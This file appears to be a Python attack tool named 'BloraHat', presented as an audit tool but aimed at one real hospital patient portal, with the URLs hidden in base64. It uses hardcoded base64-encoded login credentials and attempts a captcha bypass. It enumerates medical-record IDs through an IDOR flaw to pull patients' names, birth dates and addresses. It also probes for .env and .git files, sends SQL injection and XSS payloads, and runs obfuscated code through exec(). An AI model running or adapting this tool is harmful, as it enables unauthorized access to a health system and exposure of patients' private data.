import requests
from bs4 import BeautifulSoup
import base64
import os
import sys
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
import re

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Internal Core Helper
def _decode(data):
    return base64.b64decode(data).decode('utf-8')

def show_banner():
    banner = r"""
    ██████╗ ██╗      ██████╗ ██████╗  █████╗ ██╗  ██╗ █████╗ ████████╗
    ██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔══██╗╚══██╔══╝
    ██████╔╝██║     ██║   ██║██████╔╝███████║███████║███████║   ██║   
    ██╔══██╗██║     ██║   ██║██╔══██╗██╔══██║██╔══██║██╔══██║   ██║   
    ██████╔╝███████╗╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║   ██║   
    ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    ==================================================================
    [!] BLORAHAT V2.0 - PROFESSIONAL SECURITY AUDIT TOOL
    [!] TARGET : ..... .........
    [!] EXPLOIT: CAPTCHA BYPASS & IDOR DATA LEAKAGE
    ==================================================================
    """
    print(f"\033[92m{banner}\033[0m")

# Encrypted System Credentials
NO_RM = _decode("MDA1MTA0ODE=") 
TGL_LAHIR = _decode("MTUwMTE5OTA=") 
URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
lock = threading.Lock()
hasil_data = []
total_checked = 0

def login():
    print("[*] Initiating Security Audit: Captcha Bypass Testing...")
    try:
        get_page = session.get(URL_HAL_LOGIN)
        soup_login = BeautifulSoup(get_page.text, 'html.parser')
        input_t = soup_login.find('input', {'name': 't'})
        token_t = input_t.get('value') if input_t else ""

        # Bypass Captcha Testing: Sending empty string to 'c' parameter
        payload = {'u': NO_RM, 'p': TGL_LAHIR, 'c': '', 't': token_t}
        res = session.post(URL_ACTION_LOGIN, data=payload)
        
        if "login" in res.url:
            print("[\033[93m!\033[0m] Bypass Failed: Captcha required by server.")
            print(f"[*] Manual Step: Silakan buka {URL_HAL_LOGIN} di browser.")
            captcha = input("[?] Masukkan Captcha yang terlihat: ")
            
            if not captcha: return False
            
            payload['c'] = captcha
            res = session.post(URL_ACTION_LOGIN, data=payload)
            
            if "login" in res.url:
                print("[\033[91m!\033[0m] Access Denied: Captcha atau Kredensial salah.")
                return False

        # Mendapatkan Session ID secara dinamis dari cookie jar
        cookies = session.cookies.get_dict()
        session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or (list(cookies.values())[0] if cookies else 'Not Found')
        print(f"[\033[92m+\033[0m] Authentication Success.")
        print(f"[*] Captured Token : {token_t}")
        print(f"[*] Session ID     : {session_id}")
        return True
    except:
        return False

def fetch_data(id_num):
    global total_checked
    formatted_id = str(id_num).zfill(12)
    url = BASE_TARGET_URL + formatted_id
    
    try:
        res = session.get(url, timeout=10)
        time.sleep(0.3) # Jeda singkat untuk menghindari blokir IP
        
        with lock:
            total_checked += 1
            # Menampilkan heartbeat setiap 50 ID agar user tahu script tidak hang
            if total_checked % 50 == 0:
                print(f"[*] Scanning... Checked {total_checked} IDs", end='\r')

        if res.status_code != 200: return

        # Protected extraction and masking logic
        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result with 2 digits RM masking.
        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6M10udXBwZXIoKX0uLi57bmFtYVstMzpdLnVwcGVyKCl9JyBpZiBsZW4obmFtYSkgPiA2IGVsc2UgbmFtYQogICAgcHJpbnQoZidcbltcMDMzWzkybStcMDMzWzBtXSBEYXRhIGRpdGVtdWthbiBSTToqKioqKioqe2Zvcm1hdHRlZF9pZFstNDpdfSAtIHttYXNrfScp"))

    except Exception as e:
        pass # Diamkan error koneksi kecil agar terminal tetap bersih

def audit_security_config():
    print("[*] Starting Security Configuration Audit...")
    base_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tLw==")
    
    # 1. Security Headers Check
    print("\n[+] Audit: Security Headers Analysis")
    try:
        res = session.get(base_url, timeout=10)
        sec_headers = ["Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"]
        for h in sec_headers:
            status = "\033[92mFound\033[0m" if h in res.headers else "\033[91mMissing\033[0m"
            print(f" [!] {h.ljust(25)}: {status}")
    except: print("[!] Error: Host unreachable.")

    # 2. Information Disclosure Check (Sensitive Paths)
    print("\n[+] Audit: Sensitive Path Discovery")
    paths = [".env", ".git/config", "robots.txt", "phpinfo.php", ".htaccess"]
    for p in paths:
        target = base_url + p
        try:
            r = session.get(target, timeout=5)
            if r.status_code == 200 and len(r.text) > 0:
                print(f" [\033[91m!\033[0m] Potential Leakage : {target} (\033[91m200 OK\033[0m)")
            else:
                print(f" [\033[92m✓\033[0m] Path {p.ljust(12)} : Secure ({r.status_code})")
        except: pass

def parameter_discovery_audit():
    print("[*] Starting Parameter Discovery Audit (Authenticated)...")
    target_home = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
    
    try:
        res = session.get(target_home, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        links = soup.find_all('a', href=True)
        
        # List untuk menyimpan data link: (url_asli, url_masked, id_rm)
        potential_targets = []
        
        for link in links:
            href = link['href']
            # Filter link internal dan hindari duplikat/logout
            if any(x in href for x in ["index.php", "home"]) and "logout" not in href.lower():
                if not any(href == x[0] for x in potential_targets):
                    # Deteksi No RM (angka 6-12 digit)
                    match = re.search(r'(\d{6,12})', href)
                    id_rm = match.group(1) if match else None
                    
                    # Masking total untuk daftar (sembunyikan semua angka RM)
                    masked_url = re.sub(r'(\d{6,12})', lambda m: '*' * len(m.group(1)), href)
                    potential_targets.append((href, masked_url, id_rm))

        while True:
            if potential_targets:
                print(f"\n[+] Discovered {len(potential_targets)} unique internal links:")
                for i, target in enumerate(potential_targets):
                    print(f" [{i+1}] URL: {target[1]}")
                
                # Pilihan Target oleh Pengguna
                choice_raw = input(f"\n[?] Pilih nomor URL untuk Manipulation Test (1-{len(potential_targets)}) atau '0' untuk kembali: ")
                if choice_raw == '0': break
                
                try:
                    choice_idx = int(choice_raw) - 1
                    if choice_idx < 0 or choice_idx >= len(potential_targets):
                        print("[!] Pilihan tidak valid.")
                        continue
                    
                    base_url, _, original_id = potential_targets[choice_idx]
                    
                    if not original_id:
                        print("[!] URL ini tidak memiliki parameter ID (No RM) untuk dimanipulasi.")
                        continue

                    # 1. Tampilkan Target Awal (Masking digit ke-3 dari belakang)
                    poc_mask = "*" * (len(original_id) - 3) + original_id[-3] + "**"
                    print(f"\n[*] Target Selected: {base_url.replace(original_id, poc_mask)}")
                    
                    # 2. Automated Manipulation Test
                    print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                    
                    found_valid = False
                    max_attempts = 50 # Mencoba hingga 50 kali untuk menemukan data valid
                    
                    for attempt in range(1, max_attempts + 1):
                        offset = random.randint(-300, 300)
                        test_id = str(int(original_id) + offset).zfill(len(original_id))
                        test_url = base_url.replace(original_id, test_id)
                        
                        # Heartbeat pencarian
                        print(f"    [Attempt {attempt}] Testing ID: {'*'*(len(test_id)-3)+test_id[-3:]}", end='\r')
                        
                        test_res = session.get(test_url, timeout=10)
                        test_soup = BeautifulSoup(test_res.text, 'html.parser')
                        
                        # Inisialisasi Data
                        name, dob, address = "Unknown", "Tidak Ditemukan", "Tidak Ditemukan"
                        
                        # Ekstraksi Data secara Agresif
                        for tag in test_soup.find_all(['p', 'td', 'li', 'span']):
                            txt = tag.get_text(" ", strip=True)
                            if ":" in txt:
                                parts = txt.split(":", 1)
                                key, val = parts[0].lower(), parts[1].strip()
                                if "nama" in key: name = val
                                elif "lahir" in key: dob = val
                                elif "alamat" in key: address = val
                        
                        # Validasi: Jika nama dan alamat ditemukan, hentikan pencarian
                        if name != "Unknown" and address != "Tidak Ditemukan":
                            found_valid = True
                            result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
                            
                            # Masking 3 depan ... 3 belakang
                            m_name = f"{name[:3].upper()}...{name[-3:].upper()}" if len(name) > 6 else name.upper()
                            m_dob  = f"{dob[:3]}...{dob[-3:]}" if len(dob) > 6 else dob
                            m_addr = f"{address[:3].upper()}...{address[-3:].upper()}" if len(address) > 6 else address.upper()

                            print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
                            print(f" [!] No. RM      : {result_mask}")
                            print(f" [!] Nama        : {m_name}")
                            print(f" [!] Tgl Lahir   : {m_dob}")
                            print(f" [!] Alamat      : {m_addr}")
                            print(f" [!] Status      : \033[91mIDOR Confirmed\033[0m")
                            break
                    
                    if not found_valid:
                        print(f"\n[\033[93m!\033[0m] Discovery Failed: No valid records found in range after {max_attempts} attempts.")
                    
                    if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                        break
                except ValueError:
                    print("[!] Input harus berupa angka.")
            else:
                print("[!] No obvious tamperable parameters found on the dashboard.")
                break
        else:
            print("[!] No obvious tamperable parameters found on the dashboard.")
    except Exception as e:
        print(f"[!] Discovery Error: {str(e)}")

def vulnerability_audit():
    print("[*] Initiating Vulnerability Scan: SQL Injection & XSS...")
    target_id = input("[?] Masukkan 1 No RM contoh untuk testing (ex: 502013): ")
    if not target_id: return

    base_url = BASE_TARGET_URL + target_id
    
    # --- 1. SQL Injection Testing ---
    print("\n[+] Testing for SQL Injection (Error-Based)...")
    sqli_payloads = ["'", "''", "1' OR '1'='1", "1\" OR \"1\"=\"1"]
    sql_errors = ["SQL syntax", "mysql_fetch", "nativeclient", "Database Error"]
    
    for payload in sqli_payloads:
        test_url = base_url + payload
        try:
            res = session.get(test_url, timeout=10)
            if any(error.lower() in res.text.lower() for error in sql_errors):
                print(f" [\033[91m!\033[0m] SQLi Potential Detected with payload: {payload}")
                break
        except: pass
    else:
        print(" [\033[92m✓\033[0m] Error-Based SQLi: No obvious error patterns found.")

    # --- 2. Reflected XSS Testing (Encoded Endpoint) ---
    print("\n[+] Testing for Reflected XSS...")
    xss_payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]
    # search_endpoint encoded
    search_endpoint = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jpd2F5YXRfcGVtZXJpa3NhYW4/c2VhcmNoPQ==")
    
    for payload in xss_payloads:
        test_url = search_endpoint + payload
        try:
            res = session.get(test_url, timeout=10)
            if payload in res.text:
                print(f" [\033[91m!\033[0m] Reflected XSS Detected! Payload: {payload}")
                break
        except: pass
    else:
        print(" [\033[92m✓\033[0m] Reflected XSS: Input properly sanitized or encoded.")

    # --- 3. Stored XSS Probe ---
    print("\n[+] Probing for Stored XSS Surfaces...")
    try:
        res = session.get(base_url, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            inputs = form.find_all(['input', 'textarea'])
            for i in inputs:
                name = i.get('name', 'unnamed')
                if i.name == 'textarea' or i.get('type') == 'text':
                    print(f"     [\033[93m!\033[0m] Potential Field: {name}")
    except: pass

def start_process(start_range, end_range):
    if login():
        print(f"[*] Starting IDOR Scan for {end_range - start_range + 1} records...\n")
        with ThreadPoolExecutor(max_workers=1) as executor: # Menggunakan 1 worker agar stabil (satu per satu)
            executor.map(fetch_data, range(start_range, end_range + 1))
        print("\n[*] IDOR Audit Completed. Data displayed in terminal.")

def main_menu():
    while True:
        clear()
        show_banner()
        print(" [1] Auth Test (Captcha Bypass Testing)")
        print(" [2] IDOR Scan (Input Jumlah Data)")
        print(" [3] Security Config Audit (Headers & Files)")
        print(" [4] Parameter Discovery (URL Tampering Scan)")
        print(" [5] Vulnerability Scan (SQLi & XSS Testing)")
        print(" [0] Exit")
        print("\n")
        
        choice = input(" BloraHat > ")

        if choice == '1':
            login()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '2':
            try:
                count = int(input("[?] Jumlah data yang ingin di scan: "))
                BASE_ID = int(_decode("NTAyMDEz")) 
                # Menjalankan scan dari ID dasar sebanyak jumlah yang diminta
                start_process(BASE_ID, BASE_ID + count)
            except ValueError:
                print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '3':
            if login():
                audit_security_config()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '4':
            if login():
                parameter_discovery_audit()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '5':
            if login():
                vulnerability_audit()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '0':
            print("Happy Auditing!")
            sys.exit()
        else:
            print("Pilihan tidak valid.")
            input("Tekan Enter untuk mencoba lagi...")

if __name__ == "__main__":
    main_menu()
